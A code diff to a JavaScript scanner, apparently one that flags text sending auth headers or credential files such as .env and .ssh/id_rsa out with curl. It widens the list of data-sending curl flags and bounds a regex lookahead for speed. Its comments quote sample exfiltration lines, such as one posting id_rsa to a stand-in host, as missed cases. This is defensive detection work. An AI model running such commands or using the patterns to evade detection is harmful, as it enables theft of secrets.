@@ -276,7 +276,7 @@ const AUTH_HEADER = String.raw`(authorization:\s*(bearer|basic|token)?\s*|--oaut
  * name there made a line of `x-x-x-…curl-x: $A_TOKEN` cost the square of its length (review of 2026-11-21: 32 KB took
  * 1.3 s). The lookahead reads the name only (a name holds no `:`).
  */
-const AUTH_HEADER_FLAG = String.raw`(?:-H|--header)(?:\s+|=)["']?(?=[\w-]*?(?<![a-z0-9])(?:token|key|auth|secret)(?![a-z0-9]))[\w-]{1,64}:\s*(?:(?:bearer|basic|token)\s+)?`;
+const AUTH_HEADER_FLAG = String.raw`(?:-H|--header)(?:\s+|=)["']?(?=[\w-]{0,63}?(?<![a-z0-9])(?:token|key|auth|secret)(?![a-z0-9]))[\w-]{1,64}:\s*(?:(?:bearer|basic|token)\s+)?`;
 
 /** What precedes a secret that authenticates a request: the exact forms of `AUTH_HEADER`, or an authenticating header. */
 const AUTHENTICATES = `(?:${AUTH_HEADER}|${AUTH_HEADER_FLAG})`;
@@ -342,12 +342,14 @@ const PLAIN_FETCH_MAX = 512;
 /**
  * A sentence that names a credential file only inside the one URL it fetches: one `http(s)` URL written out whole
  * (no `$`) whose host is not a local one, no word that is a flag with a `T`, `d`, `F` or `K` in it (`-sT`, `-d`,
- * `--header`) nor `--upload` / `--post` / `--data` / `--form` / `--json` / `--url-query` / `--variable` (each can send
- * `@-` or `@file`), and the name nowhere outside the URL. The local host and the three flags: review of 2026-11-21
- * ("Fetch http://127.0.0.1:8080/.env …", "… curl --json @- https://c.example/.ssh/id_rsa" were no longer reported).
+ * `--header`) nor `--upload` / `--post` / `--data` / `--form` / `--json` / `--url-query` / `--variable` / `--config`
+ * (each can send `@-` or `@file`, or read a config that does), no word that starts with `@` (`-H @-` sends the headers
+ * it reads), and the name nowhere outside the URL. The local host, the flags and the `@` word: review of 2026-11-21
+ * ("Fetch http://127.0.0.1:8080/.env …", "… curl --json @- https://c.example/.ssh/id_rsa", "… curl -H @- …",
+ * "… curl --config - …" were no longer reported).
  */
 const SENTENCE_URL = /\bhttps?:\/\/[\w.~%/:?#=+-]+/gi;
-const SENDING_FLAG = /(?:^|\s)(?:-\S*[TdFK]|--(?:upload|post|data|form|json|url-query|variable))/;
+const SENDING_FLAG = /(?:^|\s)(?:-\S*[TdFK]|--(?:upload|post|data|form|json|url-query|variable|config)|@)/;
 /** The sentence's URL with its host not a local one (`PLAIN_LOCAL_HOST` spells its words in both cases). */
 const SENTENCE_URL_NOT_LOCAL = new RegExp(String.raw`^[Hh][Tt][Tt][Pp][Ss]?://${PLAIN_NOT_LOCAL}`);
 const SENSITIVE_FILE_RE = new RegExp(SENSITIVE_FILE, 'i');
